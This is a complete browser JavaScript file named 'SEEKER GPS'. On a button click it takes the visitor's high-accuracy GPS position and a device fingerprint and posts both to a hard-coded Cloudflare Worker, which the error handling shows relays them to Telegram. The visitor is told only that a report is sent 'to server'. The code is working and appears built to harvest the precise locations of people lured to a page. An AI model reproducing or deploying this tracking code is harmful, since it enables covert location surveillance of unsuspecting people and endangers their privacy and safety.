
// ==========================================
// SEEKER GPS - MAIN JAVASCRIPT
// ==========================================


// ==========================================
// CONFIGURATION
// ==========================================

const locationBtn = document.getElementById("locationBtn");
const result = document.getElementById("result");

// IMPORTANT:
// Use the standalone API Worker that has been tested successfully.

const WORKER_URL =
    "https://dark-hill-bae4.ykzir-polyglot.workers.dev/api/report";


// ==========================================
// 1. DEVICE INFORMATION READER
// ==========================================

function getDeviceInfo() {

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

    const ua = navigator.userAgent || "";

    let browser = "Unknown";

    if (/Edg\//i.test(ua)) {
        browser = "Microsoft Edge";
    } else if (/OPR\//i.test(ua)) {
        browser = "Opera";
    } else if (/Chrome\//i.test(ua)) {
        browser = "Google Chrome";
    } else if (/Firefox\//i.test(ua)) {
        browser = "Mozilla Firefox";
    } else if (/Safari\//i.test(ua)) {
        browser = "Safari";
    }

    return {

        userAgent: ua || "Unavailable",

        platform:
            (navigator.userAgentData &&
             navigator.userAgentData.platform) ||
            navigator.platform ||
            "Unavailable",

        browser: browser,

        language:
            navigator.language || "Unavailable",

        screenResolution:
            screen.width + " x " + screen.height,

        timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone ||
            "Unavailable",

        connectionType:
            (connection && connection.effectiveType) ||
            "Unavailable"

    };

}


// ==========================================
// 2. SEND REPORT TO CLOUDFLARE
// ==========================================

async function sendLocation(latitude, longitude, accuracy) {

    const report = {

        latitude: latitude,

        longitude: longitude,

        accuracy: Math.round(accuracy),

        device: getDeviceInfo(),

        timestamp: new Date().toISOString()

    };

    console.log("SEEKER GPS: Sending report to Cloudflare...");
    console.log("SEEKER GPS: Report prepared.");

    let response;

    try {

        response = await fetch(WORKER_URL, {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(report)

        });

    } catch (networkError) {

        console.error(
            "SEEKER GPS NETWORK ERROR:",
            networkError
        );

        throw new Error(
            "Cannot connect to Cloudflare Worker. Check your internet connection."
        );

    }

    console.log(
        "Cloudflare HTTP Status:",
        response.status
    );

    let data;

    try {

        data = await response.json();

    } catch (parseError) {

        console.error(
            "SEEKER GPS RESPONSE ERROR:",
            parseError
        );

        throw new Error(
            "Cloudflare returned an invalid or empty response."
        );

    }

    console.log(
        "Cloudflare Response:",
        data
    );

    // Worker returns success, not ok.

    if (!response.ok || data.success !== true) {

        const errorMessage = [
            data.error || "Cloudflare backend request failed.",
            data.telegram_error_code
                ? "Telegram error code: " + data.telegram_error_code
                : "",
            data.telegram_description || ""
        ].filter(Boolean).join(" | ");

        throw new Error(errorMessage);

    }

    console.log(
        "SEEKER GPS: Telegram delivery confirmed."
    );

    return data;

}


// ==========================================
// 3. LOCATION BUTTON EVENT
// ==========================================

if (!locationBtn || !result) {

    console.error(
        "SEEKER GPS ERROR: HTML elements not found."
    );

} else {

    locationBtn.addEventListener("click", function() {

        // Prevent multiple simultaneous requests.

        if (locationBtn.disabled) {
            return;
        }

        // Check browser geolocation support.

        if (!navigator.geolocation) {

            result.textContent =
                "GPS is not supported by this browser.";

            return;

        }

        // Check secure HTTPS context.

        if (!window.isSecureContext) {

            result.textContent =
                "GPS requires a secure HTTPS connection.";

            return;

        }

        locationBtn.disabled = true;

        result.textContent =
            "Requesting location permission...";

        console.log(
            "SEEKER GPS: Waiting for user location permission."
        );

        // Request location only after explicit button click.

        navigator.geolocation.getCurrentPosition(

            // ==================================
            // LOCATION SUCCESS
            // ==================================

            async function(position) {

                const latitude =
                    position.coords.latitude;

                const longitude =
                    position.coords.longitude;

                const accuracy =
                    position.coords.accuracy;

                console.log(
                    "Latitude:",
                    latitude
                );

                console.log(
                    "Longitude:",
                    longitude
                );

                console.log(
                    "Accuracy:",
                    accuracy
                );

                const device = getDeviceInfo();

                console.log(
                    "Device Information:",
                    device
                );

                result.textContent =
                    "Location obtained. Sending report to server...";

                try {

                    const response = await sendLocation(
                        latitude,
                        longitude,
                        accuracy
                    );

                    if (response.success === true) {

                        result.textContent =
                            "Location report successfully delivered!";

                        console.log(
                            "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY"
                        );

                    }

                } catch (error) {

                    console.error(
                        "SEEKER GPS BACKEND ERROR:",
                        error
                    );

                    result.textContent =
                        "Location obtained, but server delivery failed: " +
                        error.message;

                } finally {

                    locationBtn.disabled = false;

                }

            },


            // ==================================
            // LOCATION ERROR
            // ==================================

            function(error) {

                console.error(
                    "SEEKER GPS LOCATION ERROR:",
                    error
                );

                switch (error.code) {

                    case 1:

                        result.textContent =
                            "Location permission was denied.";

                        break;

                    case 2:

                        result.textContent =
                            "Location information is unavailable.";

                        break;

                    case 3:

                        result.textContent =
                            "Location request timed out.";

                        break;

                    default:

                        result.textContent =
                            "An unknown GPS error occurred.";

                }

                locationBtn.disabled = false;

            },


            // ==================================
            // GPS SETTINGS
            // ==================================

            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }

        );

    });

}


// ==========================================
// END OF SEEKER GPS
// ==========================================
